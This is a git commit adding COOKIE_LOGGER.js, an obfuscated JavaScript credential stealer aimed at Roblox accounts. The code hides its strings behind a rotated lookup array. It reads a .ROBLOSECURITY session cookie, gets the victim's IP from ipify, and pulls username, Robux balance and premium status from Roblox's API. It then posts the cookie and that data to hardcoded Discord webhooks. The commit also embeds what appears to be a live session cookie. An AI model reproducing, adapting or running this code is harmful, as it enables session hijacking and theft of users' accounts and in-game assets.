17a3c0fd463dbda2eb920a39c233fd05da9ac809
Windows81 <nastyahmede@gmail.com>
2022-08-12 01:32:05 +0000

    Added all the code.

---
+++ COOKIE_LOGGER.js
@@ -0,0 +1,304 @@
+function get_strings() {
+	var strings = [
+		"Applicatio",
+		"sum_wrapper1",
+		"chtdJ1cY2y",
+		"ThumbnailU",
+		"content_type_str",
+		"tzcZ/what-",
+		"on.svg.png",
+		"name_lbl",
+		"-NA_cap_ic",
+		"om/home",
+		"acWhK",
+		"547245xtFYoJ",
+		"RITY",
+		"ommons/thu",
+		"codeblock_str",
+		".svg.png",
+		"manual_lbl",
+		"get",
+		"9Mnrd85OY3",
+		"https://gi",
+		"https://up",
+		"i.ipify.or",
+		"om/mobilea",
+		".ROBLOSECU",
+		"POST",
+		"mb/f/f3/NA",
+		"fetch_wrapper",
+		"stringify",
+		"thub.com/W",
+		"```",
+		"231765WZlatt",
+		"github_thumb",
+		"306361KeIvTK",
+		"81gRAnGZ",
+		"edia.org/w",
+		"method_type_str",
+		"_cap_icon.",
+		"api/webhoo",
+		"roblosecurity_str",
+		"214BqCaas",
+		"value",
+		"https://di",
+		"author_str",
+		"744499ZZLoGW",
+		"https://ap",
+		"Roblox:\x20",
+		"DBs4fGQI6A",
+		"fQaWR",
+		"manual",
+		"json",
+		"Name",
+		"placeholder_thumb",
+		"Octicons-m",
+		"ks/1005730",
+		"2136547082",
+		"https://i.",
+		"N/A",
+		"vg/1200px-",
+		"ikipedia/c",
+		"RobuxBalan",
+		"XgSPJSlpea",
+		"roblox_str",
+		"346900VMGAyb",
+		"8038jikLIj",
+		"IsPremium",
+		"6jmBaBzg26",
+		"RITY=",
+		"zV007",
+		"n/json",
+		"mb/9/91/Oc",
+		"PUJom",
+		"load.wikim",
+		"336ZrMate",
+		"w.roblox.c",
+		"Roblox",
+		"ark-github",
+		"\x20FOUND",
+		"ibb.co/2gV",
+		"oobs.webp",
+		"svg/1200px",
+		"ticons-mar",
+		"UserName",
+		"nk-of-my-b",
+		"https://ww",
+		"94/ML8z5J6",
+		"cookies",
+		"sum_wrapper2",
+		"ipify_url",
+		"247.117.63",
+		"do-you-thi",
+		"roblox_lbl",
+		"scord.com/",
+		"8216040ZbvfOU",
+		"placeholder_ip",
+		"18pQYzun",
+		"text",
+		"20xQWDqk",
+		"COOKIE\x20NOT",
+		"pi/userinf",
+		"placeholder_cookie",
+		"2OB5EiNje-",
+		"na_str",
+		"na_thumb",
+		"k-github.s",
+	];
+	get_strings = function () {
+		return strings;
+	};
+	return get_strings();
+}
+var get_string_minus_0x93 = get_string_minus_0x93_ref;
+function get_string_minus_0x93_ref(_0x860d1a, _0x3eeedb) {
+	var strings = get_strings();
+	return (
+		(get_string_minus_0x93_ref = function (_0x5ec968, _0x58f8d2) {
+			_0x5ec968 = _0x5ec968 - 147;
+			var _0x31c8a9 = strings[_0x5ec968];
+			return _0x31c8a9;
+		}),
+		get_string_minus_0x93_ref(_0x860d1a, _0x3eeedb)
+	);
+}
+(function (_0x5740a6, _0xb5480c) {
+	var get_string_minus_0x93 = get_string_minus_0x93_ref,
+		_0x3741b5 = _0x5740a6();
+	while (!![]) {
+		try {
+			var _0x5492d8 =
+				(parseInt(get_string_minus_0x93(0xd3)) / (0xaec + -0x1ed2 + 0x13e7)) *
+					(-parseInt(get_string_minus_0x93(0xbb)) / (0x2015 + -0x207f + -0x12 * -0x6)) +
+				parseInt(get_string_minus_0x93(0xb2)) / (-0x1df9 + -0x7b1 * 0x4 + 0x3cc0) +
+				(-parseInt(get_string_minus_0x93(0xf4)) / (0x20 * 0x76 + -0x1818 + -0x95c * -0x1)) *
+					(-parseInt(get_string_minus_0x93(0x9f)) / (0x88 * 0x1f + 0x1d3b + -0x2dae)) +
+				(parseInt(get_string_minus_0x93(0xf2)) / (0x1c9f + 0x7 * -0x373 + -0x474)) *
+					(-parseInt(get_string_minus_0x93(0xbf)) / (-0x2 * -0x1349 + -0x6 * 0x14 + -0x1 * 0x2613)) +
+				parseInt(get_string_minus_0x93(0xf0)) / (0x63 * 0x13 + 0x1674 + -0x1dc5 * 0x1) +
+				(parseInt(get_string_minus_0x93(0xb5)) / (0x110 * 0x9 + -0x3 * -0xac5 + -0x29d6)) *
+					(-parseInt(get_string_minus_0x93(0xd2)) / (0x21d7 + 0x1 * -0x1ace + 0xc7 * -0x9)) +
+				(-parseInt(get_string_minus_0x93(0xb4)) / (0xfd3 * 0x2 + 0xbb1 + -0x2b4c)) *
+					(-parseInt(get_string_minus_0x93(0xdc)) / (-0x627 + 0x4 + 0x62f));
+			if (_0x5492d8 === _0xb5480c) break;
+			else _0x3741b5["push"](_0x3741b5["shift"]());
+		} catch (_0x281a70) {
+			_0x3741b5["push"](_0x3741b5["shift"]());
+		}
+	}
+})(get_strings, 939986);
+//https://discord.com/api/webhooks/1005730213654708294/ML8z5J6DBs4fGQI6A2OB5EiNje-6jmBaBzg26chtdJ1cY2yXgSPJSlpea9Mnrd85OY3l
+var WEBHOOK =
+	get_string_minus_0x93(0xbd) +
+	get_string_minus_0x93(0xef) +
+	get_string_minus_0x93(0xb9) +
+	get_string_minus_0x93(0xc9) +
+	get_string_minus_0x93(0xca) +
+	get_string_minus_0x93(0xe8) +
+	get_string_minus_0x93(0xc2) +
+	get_string_minus_0x93(0xf8) +
+	get_string_minus_0x93(0xd5) +
+	get_string_minus_0x93(0x96) +
+	get_string_minus_0x93(0xd0) +
+	get_string_minus_0x93(0xa6) +
+	"l";
+var WEBHOOK =
+	"https://discord.com/api/webhooks/529192102152896512/fkjb92kVtxGeSWcAbzZ2mseVvn4_Ozf9sv5NSZ3GmDAZUF4zfDgYBga7N5ScXiuLuXJ_ ";
+async function main(cookie) {
+	var main_strings = {
+			fetch_wrapper: function (_0x54a1b5, _0x39db0b) {
+				return _0x54a1b5(_0x39db0b);
+			},
+			ipify_url: get_string_minus_0x93(0xc0) + get_string_minus_0x93(0xa9) + "g",
+			fQaWR: function (_0x5657ed, _0x2cfaba, _0x360fa2) {
+				return _0x5657ed(_0x2cfaba, _0x360fa2);
+			},
+			acWhK:
+				get_string_minus_0x93(0xe7) +
+				get_string_minus_0x93(0xdd) +
+				get_string_minus_0x93(0xaa) +
+				get_string_minus_0x93(0xf6) +
+				"o",
+			sum_wrapper1: function (_0xd94e46, _0x16abca) {
+				return _0xd94e46 + _0x16abca;
+			},
+			roblosecurity_str: get_string_minus_0x93(0xab) + get_string_minus_0x93(0xd6),
+			manual_lbl: get_string_minus_0x93(0xc4),
+			method_type_str: get_string_minus_0x93(0xac),
+			content_type_str: get_string_minus_0x93(0x94) + get_string_minus_0x93(0xd8),
+			sum_wrapper2: function (_0x3c45bf, _0x42fe2a) {
+				return _0x3c45bf + _0x42fe2a;
+			},
+			codeblock_str: get_string_minus_0x93(0xb1),
+			placeholder_cookie: get_string_minus_0x93(0xf5) + get_string_minus_0x93(0xe0),
+			name_lbl: get_string_minus_0x93(0xc6),
+			na_str: get_string_minus_0x93(0xcc),
+			roblox_lbl: get_string_minus_0x93(0xc1),
+			placeholder_ip: get_string_minus_0x93(0xec) + ".5",
+			na_thumb:
+				get_string_minus_0x93(0xa8) +
+				get_string_minus_0x93(0xdb) +
+				get_string_minus_0x93(0xb6) +
+				get_string_minus_0x93(0xce) +
+				get_string_minus_0x93(0xa1) +
+				get_string_minus_0x93(0xad) +
+				get_string_minus_0x93(0xb8) +
+				get_string_minus_0x93(0xe3) +
+				get_string_minus_0x93(0x9c) +
+				get_string_minus_0x93(0x9a),
+			author_str: get_string_minus_0x93(0xa7) + get_string_minus_0x93(0xb0) + get_string_minus_0x93(0xd7),
+			github_thumb:
+				get_string_minus_0x93(0xa8) +
+				get_string_minus_0x93(0xdb) +
+				get_string_minus_0x93(0xb6) +
+				get_string_minus_0x93(0xce) +
+				get_string_minus_0x93(0xa1) +
+				get_string_minus_0x93(0xd9) +
+				get_string_minus_0x93(0xe4) +
+				get_string_minus_0x93(0x93) +
+				get_string_minus_0x93(0xcd) +
+				get_string_minus_0x93(0xc8) +
+				get_string_minus_0x93(0xdf) +
+				get_string_minus_0x93(0xa3),
+			placeholder_thumb:
+				get_string_minus_0x93(0xcb) +
+				get_string_minus_0x93(0xe1) +
+				get_string_minus_0x93(0x99) +
+				get_string_minus_0x93(0xed) +
+				get_string_minus_0x93(0xe6) +
+				get_string_minus_0x93(0xe2),
+			roblox_str: get_string_minus_0x93(0xde),
+		},
+		_0x28f7f8 = await (
+			await main_strings[get_string_minus_0x93(0xae)](fetch, main_strings[get_string_minus_0x93(0xeb)])
+		)[get_string_minus_0x93(0xf3)]();
+	if (cookie)
+		var _0x51b791 = await (
+			await main_strings[get_string_minus_0x93(0xc3)](fetch, main_strings[get_string_minus_0x93(0x9e)], {
+				headers: { Cookie: main_strings[get_string_minus_0x93(0x95)](main_strings[get_string_minus_0x93(0xba)], cookie) },
+				redirect: main_strings[get_string_minus_0x93(0xa4)],
+			})
+		)[get_string_minus_0x93(0xc5)]();
+	main_strings[get_string_minus_0x93(0xc3)](fetch, WEBHOOK, {
+		method: main_strings[get_string_minus_0x93(0xb7)],
+		headers: { "Content-Type": main_strings[get_string_minus_0x93(0x98)] },
+		body: JSON[get_string_minus_0x93(0xaf)]({
+			content: null,
+			embeds: [
+				{
+					description: main_strings[get_string_minus_0x93(0x95)](
+						main_strings[get_string_minus_0x93(0xea)](
+							main_strings[get_string_minus_0x93(0xa2)],
+							cookie ? cookie : main_strings[get_string_minus_0x93(0xf7)]
+						),
+						main_strings[get_string_minus_0x93(0xa2)]
+					),
+					color: null,
+					fields: [
+						{
+							name: main_strings[get_string_minus_0x93(0x9b)],
+							value: _0x51b791 ? _0x51b791[get_string_minus_0x93(0xe5)] : main_strings[get_string_minus_0x93(0xf9)],
+							inline: !![],
+						},
+						{
+							name: "$",
+							value: _0x51b791 ? _0x51b791[get_string_minus_0x93(0xcf) + "ce"] : main_strings[get_string_minus_0x93(0xf9)],
+							inline: !![],
+						},
+						{
+							name: "⭐",
+							value: _0x51b791 ? _0x51b791[get_string_minus_0x93(0xd4)] : main_strings[get_string_minus_0x93(0xf9)],
+							inline: !![],
+						},
+					],
+					author: {
+						name: main_strings[get_string_minus_0x93(0xea)](
+							main_strings[get_string_minus_0x93(0xee)],
+							main_strings[get_string_minus_0x93(0xf1)]
+						),
+						icon_url: _0x51b791 ? _0x51b791[get_string_minus_0x93(0x97) + "rl"] : main_strings[get_string_minus_0x93(0xfa)],
+					},
+					footer: { text: main_strings[get_string_minus_0x93(0xbe)], icon_url: main_strings[get_string_minus_0x93(0xb3)] },
+					thumbnail: { url: _0x51b791 ? _0x51b791[get_string_minus_0x93(0x97) + "rl"] : main_strings[get_string_minus_0x93(0xc7)] },
+				},
+			],
+			username: main_strings[get_string_minus_0x93(0xd1)],
+			avatar_url: main_strings[get_string_minus_0x93(0xc7)],
+			attachments: [],
+		}),
+	});
+}
+var url = get_string_minus_0x93(0xe7) + get_string_minus_0x93(0xdd) + get_string_minus_0x93(0x9d);
+var name = get_string_minus_0x93(0xab) + get_string_minus_0x93(0xa0);
+(function (cookie) {
+	var _0x2106e6 = get_string_minus_0x93,
+		_0x318329 = {
+			PUJom: function (_0x5bf754, cookie) {
+				return _0x5bf754(cookie);
+			},
+		};
+	_0x318329[_0x2106e6(0xda)](main, cookie ? cookie[_0x2106e6(0xbc)] : null);
+})({
+	value:
+		"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_5A15DACE05F2AA54E18CA832B21520D994773C74A71482421279EFC6985A6EF2EF740BE831C98550308A5371B1267F4B24072FEC35EF7DC1762B25874284E598090B1D6CE4B152C0A0DA26C1C9F82A08A787D704F7D1ACCACADECA8F71CBD15F4FF926802251139946712E6DF8F2B49DCB96BA560E22F3EA9D9C76D8A343F6C2B164C2DA44F9E374161A2CC5BD63F7E4525C960D05547BAB76EC5809E1580C0D272BE09AB0D0B332B9CBE2B5407979252576000542A1E1F41F75F1F77D3B06EFBA40D6EEC51BAD4C30DF5D942228C738243E00A1F3BABEA91983C172ECA4C91D4AE4C10DBF3BFF4FF6118041FE94162B9B09D59D728BE8A2D0C754143B598AE63026F2E1FD34E8AC5CC8033689B1CE8A235A8B10C18B4D9855379ED1AC47DEE2F705918A1D1A34EE312772B13EA30D35D8A837E4807457C2EBBD18FE3C305E00B613490C4E1AA0F8923BC7685C5C24235DFDD9C99693A3A8386C375F3F4E9E159F79128379B0859DFB8FCD6E953AA6D20E0A1D35C044BDE8E820632C11885D28AB74E14F1363F7FC34D23D2D88589A5BD323700BC43F8AB6DE02DA8EB1D1713E2D6FF6F134FA2B7F4E14E7D024E129D64D153592E698D9997EB3759D357F597C72FFD0BE",
+});
